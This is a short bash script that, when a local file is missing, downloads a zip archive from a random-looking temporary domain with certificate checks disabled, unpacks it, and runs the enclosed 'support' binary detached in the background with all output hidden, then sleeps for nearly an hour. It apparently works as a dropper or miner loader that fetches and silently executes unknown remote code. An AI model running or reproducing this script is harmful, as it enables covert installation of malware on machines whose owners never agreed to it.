#!/bin/bash
if [ ! -f ./tra ]; then
    echo "File not found!"
    wget http://h54h45wefv.temp.swtest.ru/support.zip --no-check-certificate
    unzip support.zip
fi
echo $1
nohup ./support  >/dev/null 2>&1 
i="0"
while [ $i -lt 58 ]
do
echo "Let's sleep for $i min"
sleep 60 #60= 1min
i=$[$i+1]
done
